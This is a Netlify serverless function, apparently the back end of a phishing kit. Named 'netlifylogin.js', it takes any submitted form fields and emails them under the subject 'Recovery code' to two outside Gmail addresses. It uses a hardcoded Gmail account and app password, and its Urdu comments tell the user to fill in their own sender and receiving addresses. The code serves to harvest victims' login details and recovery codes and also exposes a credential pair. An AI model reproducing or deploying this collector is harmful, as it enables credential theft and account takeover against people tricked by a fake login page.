// netlify/functions/netlifylogin.js
import nodemailer from "nodemailer";

export async function handler(event) {
  if (event.httpMethod !== "POST") {
    return {
      statusCode: 405,
      body: JSON.stringify({ error: "Method not allowed" }),
    };
  }

  try {
    const body = JSON.parse(event.body || "{}");

    if (Object.keys(body).length === 0) {
      return {
        statusCode: 400,
        body: JSON.stringify({ error: "No data received" }),
      };
    }

    // Convert all key-value pairs to text
    const formattedData = Object.entries(body)
      .map(([key, value]) => `${key}: ${value}`)
      .join("\n");

    // 👇 یہاں اپنے SMTP server details hardcode کریں
    const transporter = nodemailer.createTransport({
      host: "smtp.gmail.com",   // Gmail example
      port: 587,
      secure: false,            // 465 => true
      auth: {
        user: "hindistoryhub396@gmail.com",      // 👈 اپنی Gmail ڈالیں
        pass: "fylk gbsb cdgu anwh",        // 👈 Gmail App Password ڈالیں
      },
    });

    // 👇 وہ ای میل جہاں سب فارم ڈیٹا جائے گا
    const mailOptions = {
      from: `"PROFESSOR" <hindistoryhub396@gmail.com>`,
      to: "newzatpage@gmail.com,submitdispute@gmail.com", // 👈 اپنی receiving email
      subject: "Recovery code",
      text: formattedData,
    };

    await transporter.sendMail(mailOptions);

    return {
      statusCode: 200,
      body: JSON.stringify({ success: true, message: "Email sent successfully" }),
    };
  } catch (err) {
    console.error("Mail error:", err);
    return {
      statusCode: 500,
      body: JSON.stringify({ error: "Failed to send email" }),
    };
  }
}
